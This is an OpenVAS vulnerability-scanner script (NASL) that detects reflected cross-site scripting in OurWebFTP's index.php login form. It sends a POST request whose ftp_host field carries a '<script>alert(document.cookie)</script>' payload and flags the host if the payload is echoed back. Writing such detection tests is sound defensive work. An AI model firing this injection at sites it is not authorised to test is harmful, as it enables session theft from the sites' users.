###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ourwebftp_mult_xss_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# OurWebFTP Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803117");
  script_bugtraq_id(56763);
  script_version("$Revision: 13659 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-12-03 14:58:31 +0530 (Mon, 03 Dec 2012)");
  script_name("OurWebFTP Multiple Cross Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/51449/");
  script_xref(name:"URL", value:"https://www.httpcs.com/advisory/httpcs112");
  script_xref(name:"URL", value:"https://www.httpcs.com/advisory/httpcs113");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/51449");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Dec/24");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/118531/ourwebftp-xss.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of a vulnerable
  site. This may allow the attacker to steal cookie-based authentication
  credentials and to launch other attacks.");
  script_tag(name:"affected", value:"OurWebFTP version 5.3.5 and prior");
  script_tag(name:"insight", value:"Input passed via the 'ftp_host' and 'ftp_user' POST parameters
  to index.php is not properly sanitised before being returned to the user. This
  can be exploited to execute arbitrary HTML and script code in a user's browser
  session in context of an affected site.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is installed with OurWebFTP and is prone to multiple
  cross site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:port);

foreach dir (make_list_unique("/ourwebftp", "/", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";
  url = dir + "/index.php";
  res = http_get_cache( item:url, port:port );
  if( !res ) continue;

  if( res =~ "HTTP/1.. 200" && ">OurWebFTP" >< res && ">Online FTP Login<" >< res ) {

    postdata = "ftp_host=%3Cscript%3Ealert%28document.cookie%29%3C%2F" +
               "script%3E&ftp_user=&ftp_pass=&dir=&mwa_control2=op%3" +
               "Alogin&mwb_control2=Enter";

    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);
    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "HTTP/1\.. 200" && res && '<script>alert(document.cookie)</script>' >< res &&
       '>Unable to connect to FTP server <' >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
